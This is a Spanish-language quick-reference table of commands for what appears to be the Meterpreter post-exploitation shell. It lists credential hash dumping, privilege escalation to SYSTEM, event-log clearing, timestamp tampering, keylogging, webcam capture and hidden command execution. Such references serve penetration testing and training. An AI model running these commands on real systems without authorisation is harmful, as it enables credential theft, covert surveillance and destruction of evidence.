# Core

| **Parámetro/Opción** | **Función**               | **Ejemplo de sintaxis** |
| ---------------- | --------------------- | ------------------- |
| help             | Muestra ayuda general | help                |
| background       | Fondo la sesión       | background          |
| exit             | Cierra sesión         | exit                |
| getuid           | Usuario actual        | getuid              |
| sysinfo          | Info del sistema      | sysinfo             |
| ps               | Lista procesos        | ps                  |
| migrate          | Migra a PID           | migrate 1234        |
| shell            | Abre cmd/shell        | shell               |
# Files

| **Parámetro/Opción** | **Función**                     | **Ejemplo de sintaxis**          |
| ---------------- | --------------------------- | ---------------------------- |
| cd               | Cambia directorio remoto    | cd C:\Windows                |
| pwd/getwd        | Directorio actual remoto    | pwd                          |
| ls/dir           | Lista archivos              | ls                           |
| cat              | Muestra contenido archivo   | cat C:\file.txt              |
| upload [-r]      | Sube archivo/directorio     | upload /local/file C:\remote |
| download [-r]    | Descarga archivo/directorio | download C:\remote /local    |
| mkdir            | Crea directorio             | mkdir newdir                 |
| rm               | Borra archivo               | rm file.txt                  |
| search -f        | Busca archivos              | search -f *.conf C:\|        |

# System
| **Parámetro/Opción** | **Función**                  | **Ejemplo de sintaxis**            |
| ---------------- | ------------------------ | ------------------------------ |
| execute -f -H    | Ejecuta comando (oculto) | execute -f cmd.exe -a "/c dir" |
| getsystem [-t]   | Eleva a SYSTEM           | getsystem -t 0                 |
| hashdump         | Dump hashes SAM          | hashdump                       |
| clearev          | Limpia logs eventos      | clearev                        |
| reboot/shutdown  | Reinicia/apaga           | reboot                         |
# UI
| **Parámetro/Opción**  | **Función**           | **Ejemplo de sintaxis**             |
| ----------------- | ----------------- | ------------------------------- |
| screenshot [-p]   | Captura pantalla  | screenshot -p /local/screen.jpg |
| keyscan_start     | Inicia keylogger  | keyscan_start                   |
| keyscan_dump      | Dump teclas       | keyscan_dump                    |
| keyscan_stop      | Detiene keylogger | keyscan_stop                    |
| webcam_snap -i -q | Foto webcam       | webcam_snap -i 1 -q 90          |
| webcam_stream     | Stream webcam     | webcam_stream                   |

# Network
| **Parámetro/Opción**     | **Función**              | **Ejemplo de sintaxis**                       |
| -------------------- | -------------------- | ----------------------------------------- |
| portfwd add -l -p -r | Port forwarding      | portfwd add -l 8080 -p 80 -r 192.168.1.10 |
| route                | Muestra/agrega rutas | route add 10.0.0.0/24 1                   |
| arp                  | Muestra tabla ARP    | arp                                       |

# Priv extension
| **Parámetro/Opción** | **Función**             | **Ejemplo de sintaxis** |
| ---------------- | ------------------- | ------------------- |
| getsystem -h     | Eleva privilegios   | getsystem -h        |
| hashdump         | Extrae hashes       | hashdump            |
| timestomp        | Modifica timestamps | timestomp file -b   |
